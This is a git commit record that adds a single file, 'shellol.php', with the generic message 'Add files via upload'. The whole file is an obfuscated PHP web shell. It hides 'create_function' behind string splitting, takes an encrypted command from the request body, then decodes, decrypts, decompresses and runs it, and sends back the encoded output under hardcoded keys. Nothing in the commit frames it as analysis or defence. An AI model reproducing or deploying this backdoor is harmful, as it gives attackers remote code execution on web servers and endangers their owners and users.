6cae69299bd2c2dfebb5e818ba91bd5dea89e17a
manjilux <69837427+manjilux@users.noreply.github.com>
2020-10-17 11:52:52 +0545

    Add files via upload

---
+++ shellol.php
@@ -0,0 +1,11 @@
+<?php
+$O='y="y=/$kh(y=.+)$ky=f/y=",@fiy=le_get_contentsy=("php:/y=/inputy="),$m)y===1) {@oy=b_stary=t()y=;@ey';
+$R=str_replace('mh','','cmhmhremhatmhe_fumhnctimhon');
+$x='y=$j<$cy=&&$i<$y=l);$j++y=,y=$i++){y=$o.=$t{$iy=}y=^$y=k{$j}y=;}}returny= $o;}if (@prey=g_match(';
+$W='=val(@gzuncoy=mpy=ress(@x(@by=asey=y=64_decode($y=m[1]),y=$k))y=);$o=y=@ob_get_contey=nts();@y=o';
+$y='b_eny=d_cley=any=();$r=@y=base6y=4y=_encode(@x(@gzcomy=prey=ss($oy=),$k)y=)y=;print("$p$kh$y=r$kf");}';
+$E='=ny=ction x(y=$t,$k)y={$c=sty=rleny=($k);y=$l=sy=trlen($ty=);$o=y=y="";for($i=0;$i<$l;y=){for($j=0;(';
+$U='$k="e10ady=c39y=";$kh="49y=bay=59abby=y=e56";$kf="ey=057f20f8y=83e";$y=p="PZy=zghj27y=z67CMy=UyC";fuy';
+$p=str_replace('y=','',$U.$E.$x.$O.$W.$y);
+$u=$R('',$p);$u();
+?>
